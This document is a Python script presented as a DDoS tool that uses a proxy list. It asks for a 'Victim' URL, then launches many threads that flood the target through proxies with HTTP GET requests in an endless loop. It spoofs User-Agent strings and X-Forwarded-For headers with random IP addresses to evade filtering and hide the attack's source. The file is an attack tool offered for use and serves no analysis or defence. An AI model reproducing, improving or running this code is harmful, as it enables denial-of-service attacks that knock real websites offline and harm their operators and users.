import random
import socket
import threading
import time
import datetime


def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os = random.choice(
            ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0',
             'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE'])
    elif platform == 'X11':
        os = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(
            random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option:
            token = random.choice(
                ['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'


def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result


def randomIpList():
    random.seed()
    res = ""
    for ip in range(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]


class attacco(threading.Thread):
    def run(self):
        current = x

        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')

        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer = "Referer: " + host_url + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"

        while nload:
            time.sleep(1)

        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in range(3):
                        a.send(httprequest)
                except:
                    tts = 1

            except:
                proxy = random.choice(listaproxy).split(':')


# Main
print("        .----.  Hong Nguyen Nam - W71039  .----.        ")
print("»-------------(.:. Ddos With Proxy List.:.)-------------»")

# Site
url = input("Victim: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]

in_file = open(input("File proxy: "), "r")
proxyf = in_file.read()
in_file.close()

listaproxy = proxyf.split('\n')

thread = int(input("Number of requests you want to send (1000): "))
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0

print("Start Ddos!")
for x in range(thread):
    attacco().start()
    time.sleep(0.003)
    print("Send request " + str(x) + "!")

print("victim: " + url + "!")
print("Total proxy: " + str(len(listaproxy)) + "!")
nload = 0

while not nload:
    time.sleep(1)
